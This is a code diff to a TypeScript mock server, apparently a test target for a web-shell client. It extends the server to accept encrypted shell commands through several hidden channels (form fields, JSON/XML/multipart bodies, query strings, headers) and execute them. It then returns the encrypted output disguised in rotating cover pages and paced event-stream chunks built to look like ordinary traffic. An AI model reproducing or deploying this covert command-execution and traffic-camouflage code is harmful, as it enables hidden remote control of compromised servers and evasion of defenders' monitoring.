@@ -12,6 +12,7 @@ import http from "node:http";
 import type { AddressInfo } from "node:net";
 
 import {
+  decodeAnyBody,
   decodeRequestBody,
   deriveAesKey,
   encryptField,
@@ -19,7 +20,7 @@ import {
   injectFragment,
 } from "./mimic-shared.js";
 import { deriveMarkers, resolveCipher } from "./mimic-codecs.js";
-import type { ProfileCipher } from "../core/site-profile.js";
+import { PAYLOAD_PLACEHOLDER, type ProfileCipher, type ProfileTemplate } from "../core/site-profile.js";
 
 /** Decrypt one carrier value (query/header mode), null on failure. */
 function tryDecrypt(b64: string, aesKey: string, cipher = resolveCipher()): Buffer | null {
@@ -102,6 +103,14 @@ export interface MimicServerOptions {
   secretKey?: string;
   /** Wire codec selection — must match the profile the client uses. */
   cipher?: ProfileCipher;
+  /**
+   * Cover templates the shell rotates (default: the mock homepage). A
+   * template carrying {{payload}} gets the ciphertext substituted and is
+   * served with its own contentType — JSON/XML/JS skins work the same way.
+   */
+  templates?: ProfileTemplate[];
+  /** Carrier field names to probe (default: [pass]) — mirrors the filter's FIELDS. */
+  fields?: string[];
   /** Command execution timeout on the "target" (default 5s). */
   execTimeoutMs?: number;
 }
@@ -136,22 +145,31 @@ export async function startMimicServer(options: MimicServerOptions = {}): Promis
   const aesKey = deriveAesKey(secretKey);
   const markers = deriveMarkers(pass, secretKey, cipher);
   const execTimeoutMs = options.execTimeoutMs ?? 5_000;
-  const skin = PAGES["/"]!;
+  const skins: ProfileTemplate[] = options.templates ?? [
+    { title: "mock", template: PAGES["/"]!, contentType: "text/html; charset=utf-8" },
+  ];
+  const fields = options.fields ?? [pass];
 
   const server = http.createServer((req, res) => {
     if (req.method === "POST") {
       const chunks: Buffer[] = [];
       req.on("data", (c: Buffer) => chunks.push(c));
       req.on("end", () => {
-        // secretIn body | query | header — try each carrier in turn
-        let command = decodeRequestBody(Buffer.concat(chunks), pass, aesKey, cipher);
-        if (command === null) {
-          const query = new URL(req.url ?? "/", "http://x").searchParams.get(pass);
-          if (query) command = tryDecrypt(query, aesKey, cipher);
-        }
-        if (command === null) {
-          const header = req.headers[pass.toLowerCase()];
-          if (typeof header === "string") command = tryDecrypt(header, aesKey, cipher);
+        const rawBody = Buffer.concat(chunks);
+        // carriers: form body | raw body (json/multipart/xml) | query | header
+        let command: Buffer | null = null;
+        for (const f of fields) {
+          command = decodeRequestBody(rawBody, f, aesKey, cipher);
+          if (command === null) command = decodeAnyBody(rawBody, f, aesKey, cipher);
+          if (command === null) {
+            const query = new URL(req.url ?? "/", "http://x").searchParams.get(f);
+            if (query) command = tryDecrypt(query, aesKey, cipher);
+          }
+          if (command === null) {
+            const header = req.headers[f.toLowerCase()];
+            if (typeof header === "string") command = tryDecrypt(header, aesKey, cipher);
+          }
+          if (command !== null) break;
         }
         if (command === null) {
           res.writeHead(404, { "Content-Type": "text/html; charset=utf-8" });
@@ -160,8 +178,28 @@ export async function startMimicServer(options: MimicServerOptions = {}): Promis
         }
         void runCommand(command.toString("utf8"), execTimeoutMs).then((output) => {
           const b64 = encryptField(Buffer.from(output, "utf8"), aesKey, cipher);
-          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
-          res.end(injectFragment(skin, markers.wrap(b64)));
+          const skin = skins[Math.floor(Math.random() * skins.length)]!;
+          const body = skin.template.includes(PAYLOAD_PLACEHOLDER)
+            ? skin.template.replaceAll(PAYLOAD_PLACEHOLDER, b64)
+            : injectFragment(skin.template, markers.wrap(b64));
+          res.writeHead(200, { "Content-Type": skin.contentType });
+          if (skin.contentType.includes("event-stream")) {
+            // flush chunk by chunk with a small cadence — looks like a live
+            // stream on the wire, not a one-shot body
+            const sseChunks = body.split("\n\n").filter((c) => c.length > 0);
+            let i = 0;
+            const next = (): void => {
+              if (i < sseChunks.length) {
+                res.write(`${sseChunks[i++]!}\n\n`);
+                setTimeout(next, 25);
+              } else {
+                res.end();
+              }
+            };
+            next();
+          } else {
+            res.end(body);
+          }
         });
       });
       return;
